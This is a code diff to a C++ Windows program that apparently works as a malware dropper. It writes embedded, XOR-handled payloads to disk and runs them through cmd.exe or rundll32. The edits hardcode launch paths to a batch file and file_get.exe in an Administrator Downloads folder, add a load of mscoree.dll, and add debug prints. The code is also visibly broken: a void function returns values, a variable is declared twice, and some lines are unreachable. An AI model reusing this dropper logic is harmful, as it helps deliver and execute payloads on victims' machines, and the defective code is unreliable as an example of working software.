@@ -23,6 +23,7 @@
 #include<stdio.h>		// Debug Prints
 #include<cstdint>
 #include<windows.h>		// Resource Management
+#include<shellapi.h>
 #include"resource.h"	// Resources Definition
 #include<time.h>		// rand seed
 #include<map>
@@ -45,6 +46,7 @@
 #pragma comment(lib, "Winmm.lib")
 #pragma comment(lib, "Shlwapi.lib")
 #pragma comment(lib, "uxtheme.lib")
+#pragma comment(lib, "mscoree.lib")
 
 // Functions prototypes
 void dead();
@@ -116,7 +118,6 @@ int main(int argc, char* argv[])
 
 	// Handle to myself
 	h = GetModuleHandle(NULL);
-	std::cout << "This is the os_version: "  << os_version;
 	if (os_version == 0){
 		std::cout << "check_version failed. Cannot veriy OS version";
 		return 0;
@@ -132,6 +133,8 @@ int main(int argc, char* argv[])
 	else if (os_version == 6) {
 #ifdef W7_EXTRACT
 
+		LoadLibraryW(L"mscoree.dll");
+
 		dropper_start(2);
 		dropper_start(3);
 
@@ -146,13 +149,16 @@ int main(int argc, char* argv[])
 	#endif
 
 		drop(size2, data2, name2);
-
+		size3 = size3 - 1;
 		drop(size3, data3, name3);
 
 		bool result = non_exe_launch(name3);
 
+
+		std::cout << "before launch";
 		if (result == true){
 			exe_launch(name2);
+			std::cout << "after launch";
 		} else {
 			std::cout << "This failed and nothing happened.\n";
 		}
@@ -177,7 +183,9 @@ int main(int argc, char* argv[])
 
 		drop(size4, data4, name4);
 
+		std::cout << "before launch";
 		exe_launch(name4);
+		std::cout << "after launch";
 
 #endif
 
@@ -421,28 +429,53 @@ void dropper_start(int x){
 }
 
 bool non_exe_launch(std::string name){
-	SHELLEXECUTEINFO sei = {sizeof(sei)};
+	std::wstring ws(name.begin(), name.end());
+	SHELLEXECUTEINFOW sei = {};
+	sei.cbSize = sizeof(sei);
 	sei.fMask = SEE_MASK_NOCLOSEPROCESS;
-	sei.lpFile = name.c_str();
+	sei.hwnd = NULL;
+	sei.lpVerb = L"open";
+	sei.lpFile = L"C:\\Users\\Administrator\\Downloads\\file_move.bat";
+	sei.lpParameters = nullptr;
+	sei.lpDirectory = NULL;
 	sei.nShow = SW_SHOWNORMAL;
 
-	BOOL result = ShellExecuteEx(&sei);
-	if ( result == TRUE ){
-		WaitForSingleObject(sei.hProcess, INFINITE);
-		CloseHandle(sei.hProcess);
+	STARTUPINFOW si = {};
+	PROCESS_INFORMATION pi = {};
+	si.cb = sizeof(si);
+
+	BOOL result = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", L"/c \"C:\\Users\\Administrator\\Downloads\\file_move.bat\"", NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	if (result == true){
+		WaitForSingleObject(pi.hProcess, INFINITE);
+		CloseHandle(pi.hThread);
+		CloseHandle(pi.hProcess);
+		return true;
+	} else {
+		return false;
 	}
+
+//	BOOL result = ShellExecuteExW(&sei);
+//	if ( result == TRUE ){
+//	WaitForSingleObject(sei.hProcess, INFINITE);
+//		CloseHandle(sei.hProcess);
+//	}
+//	else {
+//		printf("this is error: %lu", GetLastError());
+//	}
 	std::cout << "This ran.\n";
 }
 
 // Launch a New Process based on the dropped file name
 void exe_launch(std::string run_exe)
 {
-	STARTUPINFOA si;
+	run_exe = "C:\\Users\\Administrator\\file_get.exe";
+	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
 	si.cb = sizeof(si);
 	ZeroMemory(&pi, sizeof(pi));
 	// build injection command
+	wchar_t cmd[] = L"/c C:\\Users\\Administrator\\Downloads\\file_get.exe";
 #ifdef INJECT
 	char cmd[10 * NAME_SIZE] = "C:\\Windows\\system32\\rundll32.exe";
 	char args[100 * NAME_SIZE];
@@ -450,11 +483,12 @@ void exe_launch(std::string run_exe)
 	CreateProcessA(cmd, args, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
 	// call directly
 #else
-	std::cout << "exe_launch" << std::endl;
-	BOOL err = CreateProcessA(run_exe.c_str(), NULL, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
-	if (!err) {
-		printf("%u\n", GetLastError());
+	BOOL err = CreateProcessW(L"C:\\Windows\\System32\\cmd.exe", cmd, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi);
+	if (err == 0) {
+		std::cout << "this failed.";
+		return false;
 	}
+	return true;
 #endif
 }
 
@@ -521,7 +555,6 @@ void* XOR(void* data, DWORD size) {
 // Drop buffer to file
 void drop(DWORD size, void* buffer, std::string drop_name)
 {
-	std::cout << "This is drop_name: " << drop_name.c_str();
 	FILE* f = fopen(drop_name.c_str(), "wb");
 	// traverse byte list
 	if (!f) {
